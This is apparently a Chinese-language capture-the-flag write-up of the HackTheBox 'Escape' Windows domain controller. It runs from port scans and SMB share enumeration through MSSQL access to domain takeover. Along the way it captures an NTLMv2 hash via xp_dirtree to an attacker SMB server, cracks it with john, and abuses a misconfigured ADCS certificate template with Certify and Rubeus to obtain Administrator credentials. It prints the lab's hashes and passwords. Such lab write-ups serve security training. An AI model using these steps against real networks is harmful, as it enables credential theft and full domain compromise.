# 信息搜集

    sudo nmap --min-rate 1000 -p- 10.10.11.202
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 09:48 CST
    Nmap scan report for 10.10.11.202
    Host is up (0.28s latency).
    Not shown: 65515 filtered tcp ports (no-response)
    PORT      STATE SERVICE
    53/tcp    open  domain
    88/tcp    open  kerberos-sec
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    389/tcp   open  ldap
    445/tcp   open  microsoft-ds
    464/tcp   open  kpasswd5
    593/tcp   open  http-rpc-epmap
    636/tcp   open  ldapssl
    1433/tcp  open  ms-sql-s
    3268/tcp  open  globalcatLDAP
    3269/tcp  open  globalcatLDAPssl
    5985/tcp  open  wsman
    9389/tcp  open  adws
    49667/tcp open  unknown
    49686/tcp open  unknown
    49687/tcp open  unknown
    49704/tcp open  unknown
    49714/tcp open  unknown
    63760/tcp open  unknown

    Nmap done: 1 IP address (1 host up) scanned in 132.27 seconds

AD 域控机器

    sudo nmap -sV -O -sT -p 53,88,135,139,389,445,464,593,636,1433,3269,3268,5985,9389,49667,49686,49704,49714,63760 10.10.11.202
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 09:58 CST
    Nmap scan report for 10.10.11.202
    Host is up (0.28s latency).

    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-02 09:58:37Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    9389/tcp  open  mc-nmf        .NET Message Framing
    49667/tcp open  msrpc         Microsoft Windows RPC
    49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49704/tcp open  msrpc         Microsoft Windows RPC
    49714/tcp open  msrpc         Microsoft Windows RPC
    63760/tcp open  msrpc         Microsoft Windows RPC
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
    No OS matches for host
    Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 68.40 seconds

可以看到解析的域名为 `sequel.htb`

# SMB

使用 smbclient 进行连接测试

    	smbclient -L \\10.10.11.202

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Public          Disk
        SYSVOL          Disk      Logon server share

使用 smbmap 可以看到更详细的内容

     smbmap -u 'guest' -p '' -H 10.10.11.202
    [+] IP: 10.10.11.202:445        Name: 10.10.11.202

        Disk                                                    PermissionsComment
        ----                                                    ------------------
        ADMIN$                                                  NO ACCESS  Remote Admin
        C$                                                      NO ACCESS  Default share
        IPC$                                                    READ ONLY  Remote IPC
        NETLOGON                                                NO ACCESS  Logon server share
        Public                                                  READ ONLY

看到 IPC 和 Public 两个文件夹是可读，其他几个没权限

![](https://pic.l1nyz-tel.cc/c4a248dfe00aa39d72aaa20dbaed09a.png)

下载到这份 pdf 文件，本地打开进行查看，可以发现两个账号和一个密码

![](https://pic.l1nyz-tel.cc/20230602112724.png)
尝试使用下面的那个账号密码登录 MSSQL Server 可行  
![](https://pic.l1nyz-tel.cc/20230602113425.png)

# MSSQL Server

不存在 xp_cmdshell 权限，但是有 xp_dirtree ，利用方式: [https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478](https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478)

![](https://pic.l1nyz-tel.cc/20230602114409.png)

获取到 hash

    [*] Incoming connection (10.10.11.202,49725)
    [*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
    [*] User DC\sql_svc authenticated successfully
    [*] sql_svc::sequel:aaaaaaaaaaaaaaaa:aa5fd28596e6ec4738bd3a288175b434:010100000000000080c8db700495d9012cd17e2add5e3d42000000000100100050004e004f00550049004800430056000300100050004e004f0055004900480043005600020010005400430050004f004a006c006e004800040010005400430050004f004a006c006e0048000700080080c8db700495d9010600040002000000080030003000000000000000000000000030000068e3392ffc49becab6e6f31eee772cb20dda3603d672d62d4613ec90cd77226e0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0033000000000000000000
    [*] Closing down connection (10.10.11.202,49725)
    [*] Remaining connections []

john 结合 rockyou.txt 爆破

    john hash -w=/usr/share/wordlists/rockyou.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
    Will run 8 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    REGGIE1234ronnie (sql_svc)
    1g 0:00:00:03 DONE (2023-06-02 11:46) 0.2666g/s 2854Kp/s 2854Kc/s 2854KC/s RENZOJAVIER..RBDesloMEJOR
    Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
    Session completed.

![](https://pic.l1nyz-tel.cc/20230602114833.png)

# User.txt

登陆上去的 sql_svc 是没有 user.txt

此时查看用户列表，里面还有 **Ryan.Cooper**

![](https://pic.l1nyz-tel.cc/20230602115034.png)

## Logs 文件

读取敏感的 SQL 文件

![](https://pic.l1nyz-tel.cc/20230602115414.png)

从中找到 Ryan.Cooper/NuclearMosquito3 （明明里面 logs 是两个 user，居然对应的一个账号一个密码

    2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
    2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
    2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
    2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]

![](https://pic.l1nyz-tel.cc/20230602134817.png)

# 提权 NTLM hash

- Reference
  - https://github.com/F41zK4r1m/HackTheBox/blob/608e814a9abe2e8350ac23d4b5810a446b457423/Escape.md

在这个 github 下载编译好的 Certify.exe 文件 [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

执行命令 `./certify.exe find /vulnerable`

    [!] Vulnerable Certificates Templates :

        CA Name                               : dc.sequel.htb\sequel-DC-CA
        Template Name                         : UserAuthentication
        Schema Version                        : 2
        Validity Period                       : 10 years
        Renewal Period                        : 6 weeks
        msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
        mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
        Authorized Signatures Required        : 0
        pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
        mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
        Permissions
          Enrollment Permissions
            Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                          sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                          sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
          Object Control Permissions
            Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
            WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                          sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                          sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
            WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                          sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                          sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
            WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                          sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                          sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519

> Following the guide, I needed to request a new certificate on behalf of a domain administrator using Certify. I specified the following parameters:

- /ca - speciffies the Certificate Authority server we're sending the request to;
- /template - specifies the certificate template that should be used for generating the new certificate;
- /altname - specifies the AD user for which the new certificate should be generated.

`certify.exe request /ca:<$certificateAuthorityHost> /template:UserAuthentication  /altname:Administrator`

![](https://pic.l1nyz-tel.cc/20230602145056.png)

把 cert.pem 复制到本地执行命令生成 pfx 文件 `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`

再将 pfx 上传回 window 靶机中

> Then, transfer the pfx file and `rubeus.exe` to the machine. We can use `asktgt` with the certificate.

`.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials`

![](https://pic.l1nyz-tel.cc/20230602145520.png)

![](https://pic.l1nyz-tel.cc/20230602145845.png)

# Solved

![](https://pic.l1nyz-tel.cc/20230602144138.png)
